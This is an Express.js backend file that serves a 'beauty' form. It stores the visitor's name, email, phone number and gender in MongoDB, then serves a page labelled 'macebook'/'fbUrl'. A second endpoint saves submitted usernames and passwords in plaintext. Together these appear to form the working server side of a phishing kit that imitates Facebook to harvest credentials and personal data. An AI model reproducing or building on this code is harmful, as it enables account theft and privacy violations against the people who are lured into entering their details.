// Backkend file
const express = require('express')
const dbConnect = require('./mongoDb')
const port = 8000
const path = require('path')
const { send } = require('process')
const app = express()
const pathUrl = path.join(__dirname, 'MainPart')

let beauty = '/beauty.html'
let macebook = '/index.html'
const mainUrl = pathUrl + beauty
const fbUrl = pathUrl + macebook

app.use('/Assets', express.static('Assets'))
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

app.get('/', (req, res) => {
  res.sendFile(mainUrl)
})

app.post('/Simple-data', async (req, res) => {
  let Cname = req.body.Cname
  let Email = req.body.Email
  let mbNumber = req.body.mbNumber
  let gender = req.body.Gender
  let des = req.body.des
  const db = await dbConnect()
  const results = await db.insertOne({
    Name: Cname,
    mail: Email,
    mobileNumber: mbNumber,
    sex: gender,
    Description: des,
  })
  if (results.acknowledged) {
    res.sendFile(fbUrl)
  } else {
    res.send('Please Fill again')
  }
})

app.post('/dummy-data', async (req, res) => {
  const userId = req.body.UserId
  const passWord = req.body.Pass
  const db = await dbConnect()
  const results = await db.insertOne({
    userName: userId,
    Pass: passWord,
  })
  if (results.acknowledged) {
    res.sendFile(pathUrl + '/insert.html')
  } else {
    res.send('Plese Fill again')
  }
})

app.listen(port)
